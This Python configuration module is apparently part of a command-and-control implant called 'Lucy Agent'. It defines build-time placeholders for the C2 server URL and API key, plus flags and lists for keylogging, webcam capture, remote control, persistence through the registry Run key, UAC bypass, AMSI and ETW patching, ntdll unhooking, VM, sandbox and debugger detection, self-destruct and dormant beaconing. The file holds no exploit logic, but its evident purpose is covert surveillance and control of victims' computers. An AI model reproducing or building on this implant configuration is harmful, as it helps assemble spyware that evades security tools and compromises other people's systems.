"""
Lucy Agent — Build-time configuration.

In production builds, these placeholders are replaced by the build system
(backend/api/build.py) via str.replace() before PyInstaller bundles the agent.

If placeholders are NOT replaced (e.g. running from source for dev), the
agent falls back to environment variables LUCY_C2_URL, LUCY_WS_URL,
LUCY_API_KEY, etc. This ensures no secrets are hardcoded in the source
repository and dev/testing still works.
"""
import os

# --- C2 connectivity (replaced at build time) ---
C2_URL = '{{C2_URL}}'  # e.g. http://192.168.1.10:8000
WS_URL = '{{WS_URL}}'  # e.g. ws://192.168.1.10:8000
API_KEY = '{{API_KEY}}'  # per-build API key

# --- Heartbeat / timing ---
HEARTBEAT_MIN = 5
HEARTBEAT_MAX = 10
TASK_TIMEOUT = 60

# --- Transport ---
USE_WEBSOCKET = True
VERIFY_SSL = False
PROXY = ""
TRANSPORT = 'websocket'
C2_PROFILE = 'http_default'

# --- Stealth ---
STEALTH_MODE = False
STEALTH_IDLE_THRESHOLD = 60
STEALTH_ACTIVE_DELAY = 5

# --- Modules to preload ---
MODULES = ['info', 'shell', 'file', 'screenshot', 'keylog', 'wifi', 'webcam',
           'screen_stream', 'remote_control', 'persistence']

# --- Anti-analysis / evasion ---
ANTI_ANALYSIS = False
AUTO_PATCH_AMSI = False
AUTO_PATCH_ETW = False
AUTO_UNHOOK_NTDLL = False
SLEEP_MASK = False
TLS_PROFILE = ''

# --- Persistence ---
PERSISTENCE = False
REGISTRY_RUN = False
UAC_BYPASS = False

# --- Build metadata ---
HIDE_WINDOW = False
STARTUP_DELAY = 0
SINGLE_EXECUTION = False
SELF_DESTRUCT = False
VM_CHECK = False
DEBUGGER_CHECK = False
SANDBOX_CHECK = False
BEACON_JITTER = False
MAX_RECONNECT = 50
CUSTOM_NAME = 'lucy_agent'
TTL_DAYS = 30
EXPIRES_AT = ''
BUILD_ID = 'local-test'
OPERATOR_ID = 'local'
AUTH_HASH = ''

# --- Dormant mode ---
DORMANT_MODE = False
DORMANT_SLEEP_MINUTES = 30
DORMANT_PERSIST = False


# ---------------------------------------------------------------------------
# Environment variable fallback for dev/testing
# ---------------------------------------------------------------------------

def _apply_env_overrides():
    """Override placeholder config with environment variables when present.

    This allows running the agent from source without embedding secrets.
    Only applies when the placeholder was NOT replaced at build time.
    """
    global C2_URL, WS_URL, API_KEY, TRANSPORT, CUSTOM_NAME, BUILD_ID, OPERATOR_ID

    env_map = {
        'LUCY_C2_URL': 'C2_URL',
        'LUCY_WS_URL': 'WS_URL',
        'LUCY_API_KEY': 'API_KEY',
        'LUCY_TRANSPORT': 'TRANSPORT',
        'LUCY_CUSTOM_NAME': 'CUSTOM_NAME',
        'LUCY_BUILD_ID': 'BUILD_ID',
        'LUCY_OPERATOR_ID': 'OPERATOR_ID',
    }
    for env_key, attr_name in env_map.items():
        val = os.environ.get(env_key)
        if val:
            globals()[attr_name] = val


# Auto-apply env overrides on import
_apply_env_overrides()
